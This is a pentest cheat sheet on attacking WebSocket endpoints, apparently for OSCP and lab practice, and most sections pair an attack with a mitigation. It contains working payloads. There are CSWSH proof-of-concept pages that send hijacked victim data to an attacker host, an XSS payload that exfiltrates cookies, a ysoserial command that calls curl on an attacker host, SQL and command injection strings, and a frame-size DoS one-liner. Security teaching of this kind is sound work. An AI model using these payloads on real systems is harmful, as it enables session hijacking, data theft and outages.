# WebSocket

> WebSocket is a full-duplex communication protocol over a single TCP connection, defined by RFC 6455. It is widely used for real-time features: chat, notifications, live updates, collaborative editing, and (increasingly) GraphQL subscriptions. WebSocket security is often overlooked by developers, leading to missing authentication, CSWSH (Cross-Site WebSocket Hijacking), and message-level injection flaws.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [Detection](#1-detection)
2. [WebSocket Basics](#2-websocket-basics)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Vulnerabilities and Exploitation](#5-vulnerabilities-and-exploitation)
6. [Tooling](#6-tooling)
7. [Post-Exploitation](#7-post-exploitation)
8. [OSCP Notes](#8-oscp-notes)
9. [References](#9-references)

---

## 1. Detection

WebSocket traffic is visible when:

- The URL scheme is `ws://` or `wss://` (in JS source, DevTools Network tab).
- HTTP response contains `Upgrade: websocket` and `Connection: Upgrade`.
- `Sec-WebSocket-Key` and `Sec-WebSocket-Version` headers are present.
- DevTools -> Network -> WS filter shows a persistent connection.
- Responses contain `101 Switching Protocols`.

### Quick detection

```bash
# Grep JS bundles for WebSocket URLs
curl -s $TARGET/static/app.js | grep -oE "(wss?://[^\"' )]+)"

# Check for WebSocket upgrade in headers
curl -sI $TARGET/ -H "Connection: Upgrade" -H "Upgrade: websocket" | grep -iE "upgrade|sec-websocket"

# Browser DevTools: Network tab -> WS filter
```

Expected output:

```text
wss://$TARGET/ws
wss://$TARGET/socket.io/?EIO=4&transport=websocket
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `ws://` or `wss://` in JS | WebSocket endpoint | Connect with wscat |
| `101 Switching Protocols` | Upgrade succeeded | Inspect frames |
| `Sec-WebSocket-Protocol` | Subprotocol | Try `graphql-ws`, `mqtt` |
| Cookie sent on upgrade | Browser auth | Test CSWSH |
| No cookie, token in query | Weak auth | Check for leaks |
| Frames are JSON | Structured messages | Fuzz fields |
| Frames are binary | Serialized objects | Check for Java/PHP serialization |

---

## 2. WebSocket Basics

### 2.1 Handshake

HTTP request:

```http
GET /ws HTTP/1.1
Host: $TARGET
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Cookie: session=...
```

Server responds:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 2.2 Frame types

- Text (opcode `0x1`): UTF-8 strings (usually JSON).
- Binary (opcode `0x2`): arbitrary bytes (protobuf, msgpack, Java serialized).
- Ping (opcode `0x9`) / Pong (opcode `0xA`): keepalive.
- Close (opcode `0x8`): termination.

### 2.3 Subprotocols

The `Sec-WebSocket-Protocol` header negotiates a subprotocol:

- `graphql-ws` / `graphql-transport-ws` (GraphQL subscriptions).
- `mqtt` / `mqttv3.1` (IoT).
- `soap`, `wamp`, `stomp`.
- Custom: `chat.v1`, `notifications`.

Server responds with the selected subprotocol or fails the handshake.

### 2.4 Authentication models

- **Cookie-based:** browser sends cookies on the upgrade request. Vulnerable to CSWSH.
- **Token in query string:** `wss://target/ws?token=...` - leaks in logs, Referer.
- **Token in first message:** client sends `{"type":"auth","token":"..."}` after connect.
- **Subprotocol-based:** token in `Sec-WebSocket-Protocol` (rare).
- **No auth:** common in internal/dev tools.

---

## 3. Enumeration

### 3.1 Find endpoints

```bash
# Common paths
for p in /ws /websocket /socket /socket.io /sockjs /graphql /live /realtime /notifications /chat /events /stream; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$p")
  echo "$code $p"
done

# From JS source
curl -s $TARGET/static/*.js | grep -oE "(wss?://[^\"' )]+)"
```

### 3.2 Connect manually

```bash
# wscat (npm)
npm install -g wscat
wscat -c wss://$TARGET/ws

# websocat (Rust, faster)
websocat wss://$TARGET/ws

# With cookies
wscat -c wss://$TARGET/ws -H "Cookie: session=eyJ..."
```

Expected output:

```text
Connected (press CTRL+C to quit)
< {"type":"welcome","user":"guest"}
> {"type":"ping"}
< {"type":"pong"}
```

### 3.3 Discover message schema

Send malformed JSON, `{}`, `null`, or unknown types. The server often responds with error messages that reveal the expected schema:

```json
> {"type":"unknown"}
< {"error":"Unknown message type. Expected one of: auth, message, subscribe, unsubscribe"}
```

### 3.4 Enumerate subprotocols

```bash
for proto in graphql-ws graphql-transport-ws mqtt mqttv3.1 soap stomp wamp chat.v1 notifications v1; do
  resp=$(curl -sI $TARGET/ws -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Protocol: $proto" | grep -i "sec-websocket-protocol")
  echo "$proto -> $resp"
done
```

### 3.5 Check auth

```bash
# Without cookie
wscat -c wss://$TARGET/ws

# With expired cookie
wscat -c wss://$TARGET/ws -H "Cookie: session=expired"

# With another user's cookie
wscat -c wss://$TARGET/ws -H "Cookie: session=<other_user>"
```

If any of these succeeds and lets you receive/send sensitive data, auth is broken.

---

## 4. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| CSWSH | Cookie auth, no Origin check | Cross-site data theft |
| Missing auth | No token required | Anonymous access |
| Auth bypass | Weak token validation | Impersonation |
| IDOR in messages | User IDs in payload | Data leak |
| Message injection | Unsanitized fields | SQLi, XSS, command injection |
| XSS via WS | Server echoes user input | Client-side code exec |
| Rate-limit bypass | No per-message limit | Brute-force, DoS |
| DoS via large frames | No size limit | Memory exhaustion |
| Binary deserialization | Java/PHP/.NET binary | RCE |
| Cross-protocol hijack | H2C smuggling | SSRF, auth bypass |
| Token in URL | Query parameter | Leak via logs, Referer |

---

## 5. Vulnerabilities and Exploitation

### 5.1 CSWSH (Cross-Site WebSocket Hijacking)

**Root cause:** The server authenticates WebSocket connections via cookies but does not validate the `Origin` header. Any origin can open a WebSocket to the target on behalf of the victim.

**Exploit HTML (attacker's page):**

```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({type: 'getProfile'}));
};
ws.onmessage = function(evt) {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: evt.data
  });
};
</script>
```

When the victim visits the attacker's page, the browser sends the target's cookies on the WebSocket upgrade, and the attacker's script receives all messages.

**Testing:**

1. Confirm the server uses cookie auth (no `Authorization` header on the WS upgrade).
2. Confirm the server does NOT validate `Origin`.
3. Craft a PoC page (above) hosted on a different origin.
4. Visit as a victim; observe messages.

> [!IMPORTANT]
> OSCP report: screenshot the WebSocket upgrade request showing cookies, the PoC HTML page, and the attacker's log endpoint receiving the victim's data.

**Mitigation:** validate the `Origin` header strictly on upgrade; use CSRF tokens or per-connection tokens; prefer token-in-first-message auth with a nonce bound to the session.

---

### 5.2 Missing authentication

**Root cause:** The server accepts WebSocket connections without any auth and exposes sensitive operations (admin actions, user data).

**Testing:**

```bash
# Anonymous connect
wscat -c wss://$TARGET/ws
> {"type":"admin.stats"}
< {"users":1234,"orders":5678,"revenue":"$1000000"}
```

> [!IMPORTANT]
> OSCP report: screenshot the connection with NO cookies/Authorization header and the response with sensitive data.

**Mitigation:** require authentication on upgrade; reject anonymous connections.

---

### 5.3 Authentication bypass

**Root cause:** The server validates the token once at connect, then never again. Or it validates a token you can forge (JWT with weak secret).

**Tests:**

- Connect with a low-privilege user, then send admin messages.
- Connect with an expired token; observe if the server closes the connection.
- Connect with a token signed by a weak secret (see JWT.md).

```json
> {"type":"auth","token":"<low_priv_token>"}
< {"type":"auth_ok","role":"user"}
> {"type":"admin.delete","user_id":2}
< {"type":"admin.delete_ok"}
```

> [!IMPORTANT]
> OSCP report: screenshot the low-privilege auth, the admin message, and the successful response.

**Mitigation:** re-check authorization on every sensitive message; never trust connect-time role.

---

### 5.4 IDOR in WebSocket messages

**Root cause:** Messages carry user IDs or object IDs without ownership checks.

```json
> {"type":"getMessages","user_id":1}
< {"messages":[...]}
> {"type":"getMessages","user_id":2}
< {"messages":[...]}  // another user's messages
```

> [!IMPORTANT]
> OSCP report: screenshot the two messages (yours and the victim's) side by side.

**Mitigation:** derive user identity from the session, not from the message payload.

---

### 5.5 Message injection (SQLi, XSS, command injection)

**Root cause:** Message fields are passed to backend sinks without sanitization.

**SQLi:**

```json
> {"type":"search","q":"' UNION SELECT username,password FROM users-- -"}
```

**XSS:** if messages are broadcast to other clients and rendered as HTML:

```json
> {"type":"chat","text":"<img src=x onerror=fetch('https://attacker/?c='+document.cookie)>"}
```

**Command injection:**

```json
> {"type":"ping","host":"127.0.0.1; id"}
```

> [!IMPORTANT]
> OSCP report: screenshot the injected message and the resulting behavior (SQL error, XSS popup with cookie, `id` output).

**Mitigation:** same as REST/GraphQL - parameterize queries, escape output, never pass to shell.

---

### 5.6 DoS via large frames

**Root cause:** No maximum frame size. Sending a 100 MB JSON object can exhaust server memory.

**Testing [LAB only]:**

```bash
# Not on production! Send 10 MB of JSON
python3 -c "print('{\"data\":\"' + 'A'*10000000 + '\"}')" | websocat wss://$TARGET/ws
```

Observe server restart, timeout, or 500.

> [!IMPORTANT]
> OSCP report: screenshot the oversized frame and the server's failure. **NEVER test this on production** - it will cause an outage.

**Mitigation:** limit frame size (`maxPayload` in ws), rate limit, timeout idle connections.

---

### 5.7 Binary deserialization (RCE)

**Root cause:** Server expects binary frames with serialized Java/PHP/.NET objects, deserializes without validation.

**Testing:**

1. Inspect binary frames (DevTools WS -> Messages -> binary tab).
2. Look for Java magic bytes: `AC ED 00 05` (Java serialization).
3. Use `ysoserial` to generate a gadget chain payload.

```bash
# Java deserialization (LAB only)
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/rce' | base64

# Send via ws
python3 send_ws_binary.py --url wss://$TARGET/ws --payload payload.bin
```

> [!IMPORTANT]
> OSCP report: screenshot the deserialization payload, the OOB callback from the target, and any RCE evidence.

**Mitigation:** never deserialize untrusted data; use safe formats (JSON, protobuf).

---

### 5.8 Cross-protocol request smuggling (H2C)

**Root cause:** A reverse proxy forwards `Upgrade: h2c` requests to the backend. Attacker can smuggle HTTP/1.1 requests via a WebSocket upgrade.

**Testing:**

```bash
# h2c smuggling test (Burp extension "HTTP Request Smuggler")
```

> [!IMPORTANT]
> OSCP report: screenshot the smuggled request and the injected response from the backend.

**Mitigation:** strip `Upgrade` and `Connection` headers at the edge; reject h2c.

---

### 5.9 Token in URL leakage

**Root cause:** `wss://target/ws?token=...`. The token appears in:

- Proxy logs.
- Browser history.
- Referer of the upgrade request.

**Testing:**

```bash
# Grep access logs (if you have them) for token
grep -oE "token=[^&]+" /var/log/nginx/access.log | head
```

> [!IMPORTANT]
> OSCP report: screenshot the URL with the token and the log line containing it.

**Mitigation:** send tokens in the first message or use `Sec-WebSocket-Protocol`.

---

## 6. Tooling

### wscat (npm)

```bash
npm install -g wscat
wscat -c wss://$TARGET/ws
wscat -c wss://$TARGET/ws -H "Cookie: session=..."
```

### websocat (Rust)

```bash
# Install
cargo install websocat
# Or download binary from GitHub releases

# Connect
websocat wss://$TARGET/ws

# With headers
websocat -H="Cookie: session=..." wss://$TARGET/ws

# Send one message and exit
echo '{"type":"ping"}' | websocat -1 wss://$TARGET/ws
```

### Burp Suite

- WebSocket history tab (Proxy -> WebSockets history).
- Repeater for WS messages (Burp 2021+).
- WebSocket Turbo Intruder for fuzzing.

### Python (websockets library)

```python
import asyncio
import websockets

async def main():
    async with websockets.connect("wss://$TARGET/ws") as ws:
        await ws.send('{"type":"ping"}')
        print(await ws.recv())

asyncio.run(main())
```

### CSWSH PoC generator

```html
<!DOCTYPE html>
<html>
<body>
<script>
var ws = new WebSocket('wss://$TARGET/ws');
ws.onopen = () => ws.send(JSON.stringify({type:'getProfile'}));
ws.onmessage = (e) => navigator.sendBeacon('https://attacker/log', e.data);
</script>
</body>
</html>
```

### WS fuzzer (Python)

```python
import asyncio, websockets, json

PAYLOADS = [
    {"type": "unknown"},
    {"type": "getProfile"},
    {"type": "getMessages", "user_id": 2},
    {"type": "admin.stats"},
    {"type": "search", "q": "'"},
]

async def main():
    async with websockets.connect("wss://$TARGET/ws") as ws:
        for p in PAYLOADS:
            await ws.send(json.dumps(p))
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=2)
                print(p, "->", resp[:200])
            except asyncio.TimeoutError:
                print(p, "-> (timeout)")

asyncio.run(main())
```

---

## 7. Post-Exploitation

After hijacking or bypassing a WebSocket:

1. **Subscribe to global channels:** `{"type":"subscribe","channel":"*"}` - receives all messages.
2. **Dump user lists:** `{"type":"getUsers"}`.
3. **Send messages as the victim:** if the server derives identity from the WS session, you can impersonate.
4. **Trigger privileged actions:** `{"type":"admin.delete","user_id":X}`.
5. **Pivot to REST/GraphQL:** tokens received over WS may work on the HTTP API.
6. **Persist:** keep the WS alive with periodic pings; some servers never expire.

```json
> {"type":"subscribe","channel":"admin"}
< {"type":"subscribed"}
< {"type":"message","channel":"admin","data":{"new_user":{"id":42,"email":"new@example.com"}}}
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for WebSocket attacks:
> - Screenshot the WebSocket upgrade request (with cookies/headers).
> - Screenshot the message exchange (sent + received).
> - For CSWSH: screenshot the attacker's PoC HTML, the victim's browser (with cookies), and the attacker's log receiving data.
> - For injection: screenshot the payload message and the resulting behavior.
> - Include timestamps.

> [!IMPORTANT]
> Burp Suite Community Edition shows WebSocket history but not WS Repeater. Use wscat or a Python script and capture the terminal output as evidence.

> [!IMPORTANT]
> For CSWSH, always test with a DIFFERENT origin (a simple `python3 -m http.server` on attacker port). Screenshot the attacker's page URL and the intercepted messages.

**Common OSCP pitfalls:**

- Browser sends cookies automatically on `wss://` upgrade - this is what makes CSWSH work.
- `Origin` check may be present but weak (prefix match, substring match). Try `https://target.com.evil.com`, `https://evil.target.com`, `null`.
- Some servers use a custom subprotocol for auth (`Sec-WebSocket-Protocol: Bearer.<jwt>`). Check the handshake.
- Socket.IO is not raw WebSocket. It has its own handshake (Engine.IO). Use `socket.io-client` or `wscat` with subprotocol `socket.io`.
- GraphQL subscriptions use `graphql-transport-ws` or `graphql-ws` subprotocol. See GraphQL.md.
- Frame size DoS will crash the server. Never test on production.

---

## 9. References

- RFC 6455 (WebSocket Protocol): https://datatracker.ietf.org/doc/html/rfc6455
- OWASP WebSocket Security: https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html
- PortSwigger WebSocket: https://portswigger.net/web-security/websockets
- HackTricks WebSocket: https://book.hacktricks.xyz/pentesting-web/websocket-attacks
- Cross-Site WebSocket Hijacking (paper): https://christian-schneider.net/CrossSiteWebSocketHijacking.html
- websocat: https://github.com/vi/websocat
- wscat: https://github.com/websockets/wscat
- ysoserial: https://github.com/frohoff/ysoserial
- CVE-2024-23897 (Jenkins WebSocket RCE): https://nvd.nist.gov/vuln/detail/CVE-2024-23897
- CVE-2020-5223 (Socket.IO CSRF): https://nvd.nist.gov/vuln/detail/CVE-2020-5223
- CVE-2023-25690 (Apache HTTPD H2C smuggling): https://nvd.nist.gov/vuln/detail/CVE-2023-25690